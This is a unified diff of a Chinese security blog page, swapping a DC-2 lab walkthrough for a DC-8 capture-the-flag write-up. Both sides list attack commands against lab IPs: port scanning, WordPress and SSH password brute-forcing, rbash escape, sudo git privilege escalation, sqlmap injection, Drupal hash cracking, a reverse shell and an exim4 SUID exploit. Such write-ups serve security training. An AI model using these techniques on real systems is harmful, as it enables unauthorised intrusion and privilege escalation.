@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   
   
-  <title>DC-2   | magisec网络安全博客</title>
+  <title>DC-8   | magisec网络安全博客</title>
 
   
     <link rel="apple-touch-icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
@@ -88,82 +88,67 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">DC-2</div>
+      <div class="post-title">DC-8</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime" title="Update time"></i>
-          2020-12-30
+          2021-01-13
         </span>
         
       </div>
       <div class="markdown-body">
         <h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p>
-<p>靶机IP：192.168.56.128</p>
-<p>修改一下hosts如下：</p>
-<p><img src="https://img.rruu.net/image/5febd14b95f22" alt="image-20201228093449722"></p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-2 192.168.56.128</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd153701ee" alt="image-20201228093122112"></p>
-<p>开放端口：80 7744</p>
-<p>80 web</p>
-<p>7744 ssh</p>
-<h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开80站点</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dc-2&#x2F;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd15972a5b" alt="image-20201228093513278"></p>
-<h3 id="cmseek识别cms"><a href="#cmseek识别cms" class="headerlink" title="cmseek识别cms"></a>cmseek识别cms</h3><p>使用cmseek识别cms，确定cms为wordpress，且版本为4.7.10。发现三位用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmseek</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd16222de9" alt="image-20201228093657685"></p>
-<h3 id="gobuster爆破目录"><a href="#gobuster爆破目录" class="headerlink" title="gobuster爆破目录"></a>gobuster爆破目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 50 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;dc-2 -o dir.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd1672d815" alt="image-20201228093819155"></p>
-<p>找到后台 wp-admin</p>
-<h3 id="wpscan检测wordpress"><a href="#wpscan检测wordpress" class="headerlink" title="wpscan检测wordpress"></a>wpscan检测wordpress</h3><p>进行常规枚举，没有发现漏洞，只能发现用户名。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd16cd8fd9" alt="image-20201228094059732"></p>
-<p>尝试暴力破解用户名密码，尝试失败。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -U admin -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd1735f27d" alt="image-20201228094556222"></p>
-<p>使用cewl生成字典</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;dc-2 &gt; pass.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd1791eb22" alt="image-20201228094644440"></p>
-<p>再次尝试使用字典爆破，成功爆破。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F;  -P .&#x2F;pass.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd17dbde16" alt="image-20201228094718264"></p>
-<h3 id="wordpress后台getshell"><a href="#wordpress后台getshell" class="headerlink" title="wordpress后台getshell"></a>wordpress后台getshell</h3><p>尝试getshell失败，后台没有任何插件，用户权限太低。</p>
-<h2 id="7744-ssh端口渗透"><a href="#7744-ssh端口渗透" class="headerlink" title="7744 ssh端口渗透"></a>7744 ssh端口渗透</h2><p>hydra暴力破解密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L .&#x2F;user.txt -P .&#x2F;pass.txt 192.168.56.128 ssh -s 7744</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd1830b605" alt="image-20201228095630140"></p>
-<p>使用tom登录系统，发现有rbash限制。我们尝试逃逸rbash限制。关于rbash逃逸的资料，<a target="_blank" rel="noopener" href="https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/">https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.56.128 -p 7744</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd18900517" alt="image-20201228100038207"></p>
-<p>使用ssh登录逃逸，逃逸失败。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.56.128 -p 7744 -t &quot;bash -noprofile&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd18e5bedd" alt="image-20201228100100919"></p>
-<p>vi逃逸，成功逃逸。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd19398e50" alt="image-20201228100803175"></p>
-<p>发现没有很多命令，我们查看一下环境变量</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd199e4147" alt="image-20201228101229078"></p>
-<p>添加一下环境变量</p>
-<p><img src="https://img.rruu.net/image/5febd19e543af" alt="image-20201228101327945"></p>
-<p>成功添加，这里提示我们su切换用户，我们尝试切换jerry用户。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd1a50ca19" alt="image-20201228101415654"></p>
-<h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><p>查看sudo配置，发现git不需要passwd，且是root权限。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd1aa0e8c2" alt="image-20201228101709351"></p>
-<h3 id="git-sudo提权"><a href="#git-sudo提权" class="headerlink" title="git sudo提权"></a>git sudo提权</h3><p>使用git suid提权，先执行第一行命令，然后执行第二行，获得root权限的shell。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help config</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd1b00dd1a" alt="image-20201228101933639"></p>
-<p><img src="https://img.rruu.net/image/5febd1b59a00a" alt="image-20201228102016209"></p>
-<h3 id="获取flag-txt"><a href="#获取flag-txt" class="headerlink" title="获取flag.txt"></a>获取flag.txt</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;final-flag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5febd1ba5cb6f" alt="image-20201228102126920"></p>
+<p>靶机IP：192.168.56.136</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-8 192.168.56.136</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815aca723b" alt="image-20210102140533518"></p>
+<p>开放端口： 22 80</p>
+<p>22 ssh</p>
+<p>80 web drupal7</p>
+<h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.136</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815b33d085" alt="image-20210102141412655"></p>
+<p>使用msf进行测试，发现不存在漏洞。</p>
+<p><img src="https://img.rruu.net/image/603815b9b5b13" alt="image-20210102141507409"></p>
+<h3 id="挖掘sql注入"><a href="#挖掘sql注入" class="headerlink" title="挖掘sql注入"></a>挖掘sql注入</h3><p>打开网页</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.136&#x2F;?nid&#x3D;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815bfa4ef0" alt="image-20210102141907738"></p>
+<p>加入单引号，发现其报错信息，进一步测试。</p>
+<p><img src="https://img.rruu.net/image/603815c6ebca7" alt="image-20210102141924279"></p>
+<p>使用wfuzz发现，payload为 1 and 1=1</p>
+<p><img src="https://img.rruu.net/image/603815cd50364" alt="image-20210102142402195"></p>
+<p>使用sqlmap进行测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.56.136&#x2F;?nid&#x3D;1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815d4d6dd5" alt="image-20210102142600720"></p>
+<p>检索数据库</p>
+<p><img src="https://img.rruu.net/image/603815dbf1d35" alt="image-20210102143912320"></p>
+<h3 id="使用hashcat破解hash"><a href="#使用hashcat破解hash" class="headerlink" title="使用hashcat破解hash"></a>使用hashcat破解hash</h3><p>破解不出来admin的密码，我们只能使用john用户。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 --force &#39;$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku&#x2F;3if&#x2F;oRVZJaz5mKC2vF&#39; &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -o hash.txt -m 7900</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815e4564d7" alt="image-20210102144512613"></p>
+<h3 id="drupal-getshell"><a href="#drupal-getshell" class="headerlink" title="drupal getshell"></a>drupal getshell</h3><p>这里有一个细节要注意前面的字符不能丢啊</p>
+<p><img src="https://img.rruu.net/image/603815ea470f1" alt="image-20210102145639912"></p>
+<p>msf配置监听会话</p>
+<p><img src="https://img.rruu.net/image/603815f04f3db" alt="image-20210102145339334"></p>
+<p>提交触发反弹会话</p>
+<p><img src="https://img.rruu.net/image/603815f6d1858" alt="image-20210102145417502"></p>
+<p>反弹成功</p>
+<p><img src="https://img.rruu.net/image/603815fc4b538" alt="image-20210102145652103"></p>
+<h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="python切换bash"><a href="#python切换bash" class="headerlink" title="python切换bash"></a>python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603816018af25" alt="image-20210102152409085"></p>
+<h3 id="exim4-suid提权"><a href="#exim4-suid提权" class="headerlink" title="exim4 suid提权"></a>exim4 suid提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603816066ebcf" alt="image-20210102153001039"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim4</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/6038160bcccd0" alt="image-20210102152455987"></p>
+<p>将sh文件保存到tmp目录，给予执行权限。 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46996">https://www.exploit-db.com/exploits/46996</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;shell.sh -m netcat</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603816111303c" alt="image-20210102153152607"></p>
+<h3 id="获取flag文件"><a href="#获取flag文件" class="headerlink" title="获取flag文件"></a>获取flag文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603816169b7d6" alt="image-20210102153223982"></p>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2020/12/30/DC-1/" target="_self">
+              <a href="/2021/01/10/DC-7/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -172,13 +157,13 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime" title="Update time"></i>
-              2020-12-30
+              2021-01-13
             </span>
             
           </div>
           <div class="post-foot-prev">
             
-              <a href="/2021/01/01/DC-3/" target="_self">
+              <a href="/2021/01/15/DC-9/" target="_self">
                 <span>Next</span>
                 <i class="iconfont icon-chevronright"></i>
               </a>
@@ -191,7 +176,7 @@
   <div class="post-catalog" id="catalog">
     <div class="title">Contents</div>
     <div class="catalog-content">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="toc-text">nmap扫描端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-text">80端口渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cmseek%E8%AF%86%E5%88%ABcms"><span class="toc-text">cmseek识别cms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gobuster%E7%88%86%E7%A0%B4%E7%9B%AE%E5%BD%95"><span class="toc-text">gobuster爆破目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wpscan%E6%A3%80%E6%B5%8Bwordpress"><span class="toc-text">wpscan检测wordpress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wordpress%E5%90%8E%E5%8F%B0getshell"><span class="toc-text">wordpress后台getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7744-ssh%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-text">7744 ssh端口渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">特权提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#git-sudo%E6%8F%90%E6%9D%83"><span class="toc-text">git sudo提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96flag-txt"><span class="toc-text">获取flag.txt</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="toc-text">nmap扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-text">80端口渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98sql%E6%B3%A8%E5%85%A5"><span class="toc-text">挖掘sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8hashcat%E7%A0%B4%E8%A7%A3hash"><span class="toc-text">使用hashcat破解hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#drupal-getshell"><span class="toc-text">drupal getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">特权提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%88%87%E6%8D%A2bash"><span class="toc-text">python切换bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exim4-suid%E6%8F%90%E6%9D%83"><span class="toc-text">exim4 suid提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96flag%E6%96%87%E4%BB%B6"><span class="toc-text">获取flag文件</span></a></li></ol></li></ol>
     </div>
   </div>
 
